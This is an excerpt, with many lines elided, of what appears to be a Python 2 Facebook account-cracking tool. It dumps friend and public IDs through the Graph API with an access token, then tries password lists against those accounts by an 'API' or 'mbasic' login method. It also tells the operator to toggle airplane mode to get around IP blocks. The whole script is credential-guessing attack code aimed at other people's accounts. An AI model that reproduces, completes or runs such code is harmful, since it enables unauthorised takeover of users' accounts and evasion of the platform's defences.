...
def banner():
	os.system("clear")
	os.system('echo  "\n\n    __________                      ___                         ___________        \n   \______   \ ____   ____    ____ \_ |__ _____  _____  _______\__    ___/ _____  \n     |       _// __ \ /    \  / ___\ | __ \\__  \ \__  \ \___  /  |    |   /     \ \n   |    |   \  \_\ )   |  \/ /_/  \| \_\ \/ __ \_/ __ \_/   /   |    |  |  | |  \\n   |____|_  /\____/|___|  /\___  / |___  /____  /____  /____ \  |____|  |__|_|  /\n   \/            \//_____/      \/     \/     \/     \/                \/  " | lolcat -a -d 2 -8')
	print("")
...
def mr_error():
    ...
    if innocent == '':
        ...
        try:
            ...
            print(" %s[%s#%s] __________________________________________________________________________________"%(N,O,N));time.sleep(2)
            ...
            for fuck in total:
            	nunu = fuck.replace("\n","")
                titid  = nunu.replace(" [✓] "," \x1b[0m[\x1b[1;91m✓\x1b[0m]\x1b[1;91m ").replace(" [×] ", " \x1b[0m[\x1b[1;92m×\x1b[0m]\x1b[1;92m ")
                print("%s%s"%(titid,N));time.sleep(0.03)
            print(" %s[%s#%s] __________________________________________________________________________________"%(N,O,N))
...
def teman(nunu):
    ...
    try:
        ...
        for a in requests.get('https://graph.facebook.com/me/friends?access_token=%s'%(nunu)).json()["data"]:
            ...
            w = random.choice(['\x1b[1;98m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;94m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;91m', '\x1b[0m'])
        ...
        os.system('echo "___________________________________________________________________________________" | lolcat -a -d 2 -8')
...
def publik(nunu):
    ...
    try:
        ...
        os.system('echo "____________________________________________________________________________________" | lolcat -a -d 2 -8')
        raw_input(' [%s ENTER%s ] '%(O,N));mr_error()
    except (KeyError,IOError):
        os.remove(knt)
        jalan('\n %s[%s!%s] ID DUMP FAILED, MAYBE THE ID IS NOT PUBLIC.\n'%(N,M,N))
...
def ua_change():
    ...
    if mew == '':
        print "\n %s[%s×%s] DON'T LEAVE IT EMPTY "%(N,M,N);ua_change()
    try:
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print '\n %s[%s×%s] FILE [%s%s%s] NOT FUND FIRST DUMP CHECK 1 TO 4 OPTIONS'%(N,M,N,M,self.apk,N);time.sleep(3)
            raw_input('\n  %s[ %sBACK%s ]'%(N,O,N));mr_error()
        ___axim_xau___ = raw_input(' [%s?%s] DO YOU WANT TO USE A MANUAL PASSWORD?  [Y/n]: '%(O,N))
        if ___axim_xau___ in ('Y', 'y'):
            print '\n %s[%s!%s] ADD MANUAL PASSWORD EXAMPLE : 786786,rongbaaz,102030'%(N,M,N)
                ...
                if pwek == '':
                    ...
                    def __axm__(uvarm=None): 
                        ...
                        if cin == '':
                            ...
                            print '\n [%s!%s] YOU CAN TURN OFF MOBILE DATA/WIFI TO PAUSE THE CRACK PROCESS\n'%(M,N)
                            ...
                            print '\n %s[%s×%s] WRONG INPUT!'%(N,M,N);self.__axm__()
                    print '\n [ CHOOSE THE LOGIN METHOD ]\n'
                    print ' [%s1%s]. API METHOD (FAST)'%(O,N)
                    print ' [%s2%s]. MBASIC METHOD (SLOW/BUT BEST)'%(O,N)
            ...
            print ' [%s2%s]. method mbasic (slow/but best)'%(O,N)
    ...
    def __api__(self, user, __axm__):
        ...
        for pw in __axm__:
            ...
            if response.status_code != 200:
                sys.stdout.write('\r %s[%s!%s] IP BLOCKED TURN ON AIRPLANE MODE 10 SECONDS'%(N,M,N)),
                sys.stdout.flush()
                loop +=1
                self.__api__()
